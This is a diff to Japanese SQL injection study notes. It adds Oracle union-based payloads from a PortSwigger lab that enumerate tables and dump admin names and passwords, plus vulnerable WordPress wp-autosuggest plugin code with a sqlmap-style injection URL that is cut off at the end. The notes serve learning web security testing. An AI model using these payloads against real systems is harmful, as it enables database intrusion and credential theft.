@@ -5,6 +5,7 @@
 ```
 'or 1=1;#
 '
+< > ' " { } ;
 ```
 
 ※システムエラー画面に遷移したら脆弱性と判断して問題ない
@@ -118,5 +119,81 @@ SHOW Grants;
 
 ```
 show variables;
+```
+
+
+
+### Oracle SQL injection
+
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+
+脆弱性の確認
+
+```
+< > ' " { } ;
+```
+
+500 internal Server Error
+
+レコード全表示
+
+```
+' or 1=1 --
+```
+
+カラム数の確認
+
+```
+'or 1=1 order by 1 --
+'or 1=1 order by 2 --
+'or 1=1 order by 3 --
+'or 1=1 order by 4 --
+```
+
+![image-20230225235709643](img/SQLinjection/image-20230225235709643.png)
+
+テーブル名の確認（カラム数3の場合）
+
+```
+'or 1=1 union select table_name, null, null FROM all_tables--
+```
+
+カラム名の確認（カラム数3の場合）
+
+```
+'or 1=1 union select column_name, null, null FROM all_tab_columns WHERE table_name='WEB_ADMINS'--
+```
+
+テーブルのレコードの確認
+
+```
+'or 1=1 union select ADMIN_NAME, PASSWORD, ADMIN_ID FROM WEB_ADMINS--
+```
+
+* カラム同士の型があっていないとエラーになるので注意
+
+```
+ADMIN_NAME, NULL, NULL
+NULL, ADMIN_NAME, NULL
+NULL, NULL, ADMIN_NAME
+```
+
+のように順々に型の合うカラムを探していけばよい
+
+
+
+### php like句のSQL injection (sqlmapのコマンドを転記）
+
+```php
+if (isset($_GET['wpas_keys'])) {
+	$wpas_keys = $_GET['wpas_keys'];
+}
+...
+$wpas_keys = str_replace(' ','%',$wpas_keys);
+	$pageposts = $wpdb->get_results("SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC");
+```
+
+```
+/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=-6622')/**/OR/**/QUARTER(NULL)/**/IS/**/NULL/**/AND/**/
 ```
 
